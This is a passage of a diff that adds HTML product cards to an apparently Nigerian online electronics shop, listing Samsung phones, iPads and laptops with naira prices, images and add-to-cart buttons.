+        <button class="add-to-cart-btn" 
+            data-product="Samsung Note 20 128GB" 
+            data-price="250000" 
+            data-img="https://i.pinimg.com/1200x/eb/cb/db/ebcbdb1241d287605ccc63095f212cf9.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- Samsung S10 128GB -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/27/90/f4/2790f4ef0a0f7999bb3c8b982320c4b7.jpg"
+         alt="Samsung S10 128GB" class="product-image">
+    <div class="product-info">
+        <h3>Samsung Galaxy S10</h3>
+        <p class="description"><b>ROM: 128GB</b></p>
+        <p class="price">₦190,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="Samsung S10 128GB" 
+            data-price="190000" 
+            data-img="https://i.pinimg.com/1200x/27/90/f4/2790f4ef0a0f7999bb3c8b982320c4b7.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- Samsung S21 FE 128GB -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/0e/ec/7d/0eec7d61e7b909265cf81b64669fef48.jpg"
+         alt="Samsung S21 FE 128GB" class="product-image">
+    <div class="product-info">
+        <h3>Samsung Galaxy S21 FE</h3>
+        <p class="description"><b>ROM: 128GB</b></p>
+        <p class="price">₦235,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="Samsung S21 FE 128GB" 
+            data-price="235000" 
+            data-img="https://i.pinimg.com/1200x/0e/ec/7d/0eec7d61e7b909265cf81b64669fef48.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+<!-- Samsung S21 Plus 128GB -->
+<div class="product-card">
+    <img src="https://ng.jumia.is/unsafe/fit-in/680x680/filters:fill(white)/product/50/9111204/1.jpg?6085"
+         alt="Samsung S21 Plus 128GB" class="product-image">
+    <div class="product-info">
+        <h3>Samsung Galaxy S21 Plus</h3>
+        <p class="description"><b>ROM: 128GB</b></p>
+        <p class="price">₦292,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="Samsung S21 Plus 128GB" 
+            data-price="292000" 
+            data-img="https://ng.jumia.is/unsafe/fit-in/680x680/filters:fill(white)/product/50/9111204/1.jpg?6085">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- Samsung S22 128GB -->
+<div class="product-card">
+    <img src="https://ng.jumia.is/unsafe/fit-in/680x680/filters:fill(white)/product/25/3845963/1.jpg?4284"
+         alt="Samsung S22 128GB" class="product-image">
+    <div class="product-info">
+        <h3>Samsung Galaxy S22</h3>
+        <p class="description"><b>ROM: 128GB</b></p>
+        <p class="price">₦287,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="Samsung S22 128GB" 
+            data-price="287000" 
+            data-img="https://ng.jumia.is/unsafe/fit-in/680x680/filters:fill(white)/product/25/3845963/1.jpg?4284">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- Samsung S22 Ultra 256GB (Locked) -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/5d/07/96/5d079647a7d622eb3e614533b0292f76.jpg"
+         alt="Samsung S22 Ultra 256GB Locked" class="product-image">
+    <div class="product-info">
+        <h3>Samsung Galaxy S22 Ultra</h3>
+        <p class="description"><b>ROM: 256GB</b> <br> <b>Status: Locked</b></p>
+        <p class="price">₦385,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="Samsung S22 Ultra 256GB (Locked)" 
+            data-price="385000" 
+            data-img="https://i.pinimg.com/1200x/5d/07/96/5d079647a7d622eb3e614533b0292f76.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+
+
+<!-- Samsung S23 Plus 256GB -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/736x/fd/51/ad/fd51ad018a40c9569e867baa3b918243.jpg"
+         alt="Samsung S23 Plus 256GB" class="product-image">
+    <div class="product-info">
+        <h3>Samsung Galaxy S23 Plus</h3>
+        <p class="description"><b>ROM: 256GB</b></p>
+        <p class="price">₦533,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="Samsung S23 Plus 256GB" 
+            data-price="533000" 
+            data-img="https://i.pinimg.com/736x/fd/51/ad/fd51ad018a40c9569e867baa3b918243.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+<!-- Samsung S23 Ultra 256GB (Low LCD) -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/736x/5b/c6/88/5bc688573776535c97bee6c391be1b5c.jpg"
+         alt="Samsung S23 Ultra 256GB (Low LCD)" class="product-image">
+    <div class="product-info">
+        <h3>Samsung Galaxy S23 Ultra</h3>
+        <p class="description"><b>ROM: 256GB (Low LCD)</b></p>
+        <p class="price">₦550,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="Samsung S23 Ultra 256GB (Low LCD)" 
+            data-price="550000" 
+            data-img="https://i.pinimg.com/736x/5b/c6/88/5bc688573776535c97bee6c391be1b5c.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- Samsung S23 128GB -->
+
+<div class="product-card">
+    <img src="https://i.pinimg.com/736x/79/3e/c8/793ec8d178e9d8c1e7391facfe8b67f7.jpg"
+         alt="Samsung S23 128GB" class="product-image">
+    <div class="product-info">
+        <h3>Samsung Galaxy S23</h3>
+        <p class="description"><b>ROM: 128GB</b></p>
+        <p class="price">₦410,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="Samsung S23 128GB" 
+            data-price="410000" 
+            data-img="https://i.pinimg.com/736x/79/3e/c8/793ec8d178e9d8c1e7391facfe8b67f7.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+<!-- Samsung S23 Ultra 256GB -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/fe/89/30/fe8930f99e8628ff9403a68ff65469ea.jpg"
+         alt="Samsung S23 Ultra 256GB" class="product-image">
+    <div class="product-info">
+        <h3>Samsung Galaxy S23 Ultra</h3>
+        <p class="description"><b>ROM: 256GB</b></p>
+        <p class="price">₦689,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="Samsung S23 Ultra 256GB" 
+            data-price="689000" 
+            data-img="https://i.pinimg.com/1200x/8a/63/8c/8a638c2b8e4cddf42287f1794e21a6ac.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- Samsung S23 Ultra 512GB (MDM) -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/d5/2f/7e/d52f7e734a8db9a54af4f6b306cb3300.jpg"
+         alt="Samsung S23 Ultra 512GB (MDM)" class="product-image">
+    <div class="product-info">
+        <h3>Samsung Galaxy S23 Ultra</h3>
+        <p class="description"><b>ROM: 512GB (MDM)</b></p>
+        <p class="price">₦625,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="Samsung S23 Ultra 512GB (MDM)" 
+            data-price="625000" 
+            data-img="https://i.pinimg.com/1200x/d5/2f/7e/d52f7e734a8db9a54af4f6b306cb3300.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- Samsung S24 128GB -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/b8/e1/9d/b8e19d3f7f36b10118b01c0a9a747be7.jpg"
+         alt="Samsung S24 128GB" class="product-image">
+    <div class="product-info">
+        <h3>Samsung Galaxy S24</h3>
+        <p class="description"><b>ROM: 128GB</b></p>
+        <p class="price">₦464,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="Samsung S24 128GB" 
+            data-price="464000" 
+            data-img="https://i.pinimg.com/1200x/b8/e1/9d/b8e19d3f7f36b10118b01c0a9a747be7.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- Samsung S24 Ultra 256GB -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/29/29/d3/2929d315adb80a6a4be198fd91109580.jpg"
+         alt="Samsung S24 Ultra 256GB" class="product-image">
+    <div class="product-info">
+        <h3>Samsung Galaxy S24 Ultra</h3>
+        <p class="description"><b>ROM: 256GB</b></p>
+        <p class="price">₦928,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="Samsung S24 Ultra 256GB" 
+            data-price="928000" 
+            data-img="https://i.pinimg.com/1200x/29/29/d3/2929d315adb80a6a4be198fd91109580.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- Samsung S24 Ultra 512GB -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/1e/14/cd/1e14cda06e61b09b5e3c1ed4642f4490.jpg"
+         alt="Samsung S24 Ultra 512GB" class="product-image">
+    <div class="product-info">
+        <h3>Samsung Galaxy S24 Ultra</h3>
+        <p class="description"><b>ROM: 512GB</b></p>
+        <p class="price">₦977,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="Samsung S24 Ultra 512GB" 
+            data-price="977000" 
+            data-img="https://i.pinimg.com/1200x/1e/14/cd/1e14cda06e61b09b5e3c1ed4642f4490.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+<!-- Samsung Flip 4 128GB -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/42/fc/d3/42fcd3fe976020bd31c5c368c7cede62.jpg"
+         alt="Samsung Flip 4 128GB" class="product-image">
+    <div class="product-info">
+        <h3>Samsung Galaxy Z Flip 4</h3>
+        <p class="description"><b>ROM: 128GB</b></p>
+        <p class="price">₦294,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="Samsung Flip 4 128GB" 
+            data-price="294000" 
+            data-img="https://i.pinimg.com/1200x/42/fc/d3/42fcd3fe976020bd31c5c368c7cede62.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- Samsung Flip 4 256GB -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/1d/11/7c/1d117c5a4d65698065728773fcd3d58d.jpg"
+         alt="Samsung Flip 4 256GB" class="product-image">
+    <div class="product-info">
+        <h3>Samsung Galaxy Z Flip 4</h3>
+        <p class="description"><b>ROM: 256GB</b></p>
+        <p class="price">₦336,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="Samsung Flip 4 256GB" 
+            data-price="336000" 
+            data-img="https://i.pinimg.com/1200x/1d/11/7c/1d117c5a4d65698065728773fcd3d58d.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- Samsung Flip 5 256GB -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/5c/44/a7/5c44a7420e231e702aa6008a20b437d3.jpg"
+         alt="Samsung Flip 5 256GB" class="product-image">
+    <div class="product-info">
+        <h3>Samsung Galaxy Z Flip 5</h3>
+        <p class="description"><b>ROM: 256GB</b></p>
+        <p class="price">₦441,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="Samsung Flip 5 256GB" 
+            data-price="441000" 
+            data-img="https://i.pinimg.com/1200x/5c/44/a7/5c44a7420e231e702aa6008a20b437d3.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- Samsung Flip 5 LCD Dot -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/b4/0e/1a/b40e1a3385eed5bc6f1037bd6d4cff56.jpg"
+         alt="Samsung Flip 5 LCD Dot" class="product-image">
+    <div class="product-info">
+        <h3>Samsung Galaxy Z Flip 5</h3>
+        <p class="description"><b>LCD Dot Edition</b></p>
+        <p class="price">₦300,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="Samsung Flip 5 LCD Dot" 
+            data-price="300000" 
+            data-img="https://i.pinimg.com/1200x/b4/0e/1a/b40e1a3385eed5bc6f1037bd6d4cff56.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- Samsung Fold 3 256GB -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/ba/87/e6/ba87e62cee6f63e22533b122d1da1fa7.jpg"
+         alt="Samsung Fold 3 256GB" class="product-image">
+    <div class="product-info">
+        <h3>Samsung Galaxy Z Fold 3</h3>
+        <p class="description"><b>ROM: 256GB</b></p>
+        <p class="price">₦685,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="Samsung Fold 3 256GB" 
+            data-price="685000" 
+            data-img="https://i.pinimg.com/1200x/ba/87/e6/ba87e62cee6f63e22533b122d1da1fa7.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- Samsung Fold 4 256GB -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/44/40/e2/4440e2c23827d90286d3d2f3c5137040.jpg"
+         alt="Samsung Fold 4 256GB" class="product-image">
+    <div class="product-info">
+        <h3>Samsung Galaxy Z Fold 4</h3>
+        <p class="description"><b>ROM: 256GB</b></p>
+        <p class="price">₦727,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="Samsung Fold 4 256GB" 
+            data-price="727000" 
+            data-img="https://i.pinimg.com/1200x/44/40/e2/4440e2c23827d90286d3d2f3c5137040.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- Samsung Tab 9 Plus 64GB -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/82/e3/9f/82e39f5004757044a9c5a5c54a27c257.jpg"
+         alt="Samsung Tab 9 Plus 64GB" class="product-image">
+    <div class="product-info">
+        <h3>Samsung Galaxy Tab 9 Plus</h3>
+        <p class="description"><b>ROM: 64GB</b></p>
+        <p class="price">₦199,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="Samsung Tab 9 Plus 64GB" 
+            data-price="199000" 
+            data-img="https://i.pinimg.com/1200x/82/e3/9f/82e39f5004757044a9c5a5c54a27c257.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+<!-- Samsung Galaxy Tab A7 Lite -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/62/eb/72/62eb725be88da3585a15509a6fe093f1.jpg"
+         alt="Galaxy Tab A7 Lite" class="product-image">
+    <div class="product-info">
+        <h3>Galaxy Tab A7 Lite</h3>
+        <p class="description"><b>Status: Brand New</b></p>
+        <p class="price">₦160,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="Galaxy Tab A7 Lite" 
+            data-price="160000" 
+            data-img="https://i.pinimg.com/1200x/62/eb/72/62eb725be88da3585a15509a6fe093f1.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- iPad Air 4th Gen 64GB (WiFi only) -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/2d/d6/ee/2dd6ee013d56c7e259a10ada89cd8fb7.jpg"
+         alt="iPad Air 4th Gen 64GB" class="product-image">
+    <div class="product-info">
+        <h3>iPad Air 4th Gen</h3>
+        <p class="description"><b>ROM: 64GB | WiFi Only</b></p>
+        <p class="price">₦500,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="iPad Air 4th Gen 64GB (WiFi only)" 
+            data-price="500000" 
+            data-img="https://i.pinimg.com/1200x/2d/d6/ee/2dd6ee013d56c7e259a10ada89cd8fb7.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- iPad Pro 11 4th Gen 128GB -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/c1/11/7c/c1117c3576cfbef3a09a4a6806b8b0cf.jpg"
+         alt="iPad Pro 11 4th Gen 128GB" class="product-image">
+    <div class="product-info">
+        <h3>iPad Pro 11" 4th Gen</h3>
+        <p class="description"><b>ROM: 128GB | Open Box | WiFi Only</b></p>
+        <p class="price">₦1,080,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="iPad Pro 11 4th Gen 128GB (WiFi only)" 
+            data-price="1080000" 
+            data-img="https://i.pinimg.com/1200x/c1/11/7c/c1117c3576cfbef3a09a4a6806b8b0cf.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- iPad 10th Gen (WiFi only) -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/6b/ef/cd/6befcdbc8c745705b0fd73fbd6112d0e.jpg"
+         alt="iPad 10th Gen WiFi" class="product-image">
+    <div class="product-info">
+        <h3>iPad 10th Gen</h3>
+        <p class="description"><b>WiFi Only</b></p>
+        <p class="price">₦430,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="iPad 10th Gen (WiFi only)" 
+            data-price="430000" 
+            data-img="https://i.pinimg.com/1200x/6b/ef/cd/6befcdbc8c745705b0fd73fbd6112d0e.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- iPad 10th Gen 64GB (WiFi + Cellular) -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/39/c3/d1/39c3d14efc7d7582b958e5a72a9a6162.jpg"
+         alt="iPad 10th Gen 64GB WiFi + Cellular" class="product-image">
+    <div class="product-info">
+        <h3>iPad 10th Gen</h3>
+        <p class="description"><b>ROM: 64GB | WiFi + Cellular</b></p>
+        <p class="price">₦450,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="iPad 10th Gen 64GB (WiFi + Cellular)" 
+            data-price="450000" 
+            data-img="https://i.pinimg.com/1200x/39/c3/d1/39c3d14efc7d7582b958e5a72a9a6162.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+</section>
+
+<section id="laptops-products" class="products-section">
+    <div class="container">
+        <div class="section-header">
+            <h2>High-Performance Laptops</h2>
+            <p>Powerful machines for work and play</p>
+        </div>
+        <div class="products-grid">
+          <!-- HP EliteBook 1030 G2 256/8GB Core i5 -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/6f/be/0e/6fbe0e727a76cf0b8259fdb2acb3430b.jpg" 
+         alt="HP EliteBook 1030 G2 256/8GB Core i5" class="product-image">
+    <div class="product-info">
+        <h3>HP EliteBook 1030 G2</h3>
+        <p class="description"><b>256GB SSD / 8GB RAM / Core i5</b></p>
+        <p class="price">₦390,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="HP EliteBook 1030 G2 256/8GB Core i5" 
+            data-price="390000" 
+            data-img="https://i.pinimg.com/1200x/6f/be/0e/6fbe0e727a76cf0b8259fdb2acb3430b.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- HP EliteBook 1030 G2 512/16GB Core i7 -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/eb/b5/5c/ebb55ca2bff18c810cf2267e7d99db2d.jpg" 
+         alt="HP EliteBook 1030 G2 512/16GB Core i7" class="product-image">
+    <div class="product-info">
+        <h3>HP EliteBook 1030 G2</h3>
+        <p class="description"><b>512GB SSD / 16GB RAM / Core i7</b></p>
+        <p class="price">₦430,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="HP EliteBook 1030 G2 512/16GB Core i7" 
+            data-price="430000" 
+            data-img="https://i.pinimg.com/1200x/eb/b5/5c/ebb55ca2bff18c810cf2267e7d99db2d.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- HP EliteBook 1030 G3 512/16GB Core i7 -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/80/53/36/8053361ff1aa3e289299b380ec7e35c9.jpg" 
+         alt="HP EliteBook 1030 G3 512/16GB Core i7" class="product-image">
+    <div class="product-info">
+        <h3>HP EliteBook 1030 G3</h3>
+        <p class="description"><b>512GB SSD / 16GB RAM / Core i7</b></p>
+        <p class="price">₦480,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="HP EliteBook 1030 G3 512/16GB Core i7" 
+            data-price="480000" 
+            data-img="https://i.pinimg.com/1200x/80/53/36/8053361ff1aa3e289299b380ec7e35c9.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- HP EliteBook 1030 G4 256/16GB Core i5 -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/736x/74/e0/88/74e0887cbaf46505375a5bcd8fe498fb.jpg" 
+         alt="HP EliteBook 1030 G4 256/16GB Core i5" class="product-image">
+    <div class="product-info">
+        <h3>HP EliteBook 1030 G4</h3>
+        <p class="description"><b>256GB SSD / 16GB RAM / Core i5</b></p>
+        <p class="price">₦455,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="HP EliteBook 1030 G4 256/16GB Core i5" 
+            data-price="455000" 
+            data-img="https://i.pinimg.com/736x/74/e0/88/74e0887cbaf46505375a5bcd8fe498fb.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- HP EliteBook 1040 G6 256/8GB Core i5 -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/eb/b5/5c/ebb55ca2bff18c810cf2267e7d99db2d.jpg" 
+         alt="HP EliteBook 1040 G6 256/8GB Core i5" class="product-image">
+    <div class="product-info">
+        <h3>HP EliteBook 1040 G6</h3>
+        <p class="description"><b>256GB SSD / 8GB RAM / Core i5</b></p>
+        <p class="price">₦400,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="HP EliteBook 1040 G6 256/8GB Core i5" 
+            data-price="400000" 
+            data-img="https://i.pinimg.com/1200x/eb/b5/5c/ebb55ca2bff18c810cf2267e7d99db2d.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- HP EliteBook 840 G5 8/256GB Non-touch -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/27/aa/40/27aa40a0b2b34bfa93c232046cd03470.jpg" 
+         alt="HP EliteBook 840 G5 8/256GB" class="product-image">
+    <div class="product-info">
+        <h3>HP EliteBook 840 G5</h3>
+        <p class="description"><b>256GB SSD / 8GB RAM (Non-touch)</b></p>
+        <p class="price">₦330,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="HP EliteBook 840 G5 256/8GB" 
+            data-price="330000" 
+            data-img="https://i.pinimg.com/1200x/27/aa/40/27aa40a0b2b34bfa93c232046cd03470.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- HP EliteBook 840 G6 8/256GB Touch -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/f2/07/19/f207192800f8d79c933e48cf42baf7cb.jpg" 
+         alt="HP EliteBook 840 G6 8/256GB Touch" class="product-image">
+    <div class="product-info">
+        <h3>HP EliteBook 840 G6</h3>
+        <p class="description"><b>256GB SSD / 8GB RAM (Touchscreen ✅)</b></p>
+        <p class="price">₦350,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="HP EliteBook 840 G6 256/8GB Touch" 
+            data-price="350000" 
+            data-img="https://i.pinimg.com/1200x/f2/07/19/f207192800f8d79c933e48cf42baf7cb.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- ASUS Zenbook 14 OLED Touch -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/03/41/b2/0341b26171567f501c90dab8fd0a93a3.jpg" 
+         alt="ASUS Zenbook 14 OLED Touch Ryzen 7" class="product-image">
+    <div class="product-info">
+        <h3>ASUS Zenbook 14 OLED Touch</h3>
+        <p class="description"><b>Ryzen 7 / 16GB RAM / 512GB SSD</b></p>
+        <p class="price">₦1,000,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="ASUS Zenbook 14 OLED Touch" 
+            data-price="1000000" 
+            data-img="https://i.pinimg.com/1200x/03/41/b2/0341b26171567f501c90dab8fd0a93a3.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- MacBook Air 2022 M2 8/256GB -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/9a/32/41/9a32412dc9c59b4ba7ab7af8f70796c5.jpg" 
+         alt="MacBook Air 2022 M2 8/256GB" class="product-image">
+    <div class="product-info">
+        <h3>MacBook Air 2022 M2</h3>
+        <p class="description"><b>8GB RAM / 256GB SSD</b></p>
+        <p class="price">₦1,030,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
+            <button class="qty-btn plus">+</button>
+        </div>
+        <button class="add-to-cart-btn" 
+            data-product="MacBook Air 2022 M2 8/256GB" 
+            data-price="1030000" 
+            data-img="https://i.pinimg.com/1200x/9a/32/41/9a32412dc9c59b4ba7ab7af8f70796c5.jpg">
+            Add to Cart
+        </button>
+    </div>
+</div>
+
+<!-- MacBook Air 2024 M3 13" 8/256GB -->
+<div class="product-card">
+    <img src="https://i.pinimg.com/1200x/71/7c/46/717c462ad881835aa7e6d9f8dfa193eb.jpg" 
+         alt="MacBook Air 2024 M3 13&quot; 8/256GB" class="product-image">
+    <div class="product-info">
+        <h3>MacBook Air 2024 M3 13"</h3>
+        <p class="description"><b>8GB RAM / 256GB SSD (CC27)</b></p>
+        <p class="price">₦1,490,000</p>
+        <div class="quantity-selector">
+            <button class="qty-btn minus">-</button>
+            <input type="number" class="qty-input" value="1" min="1">
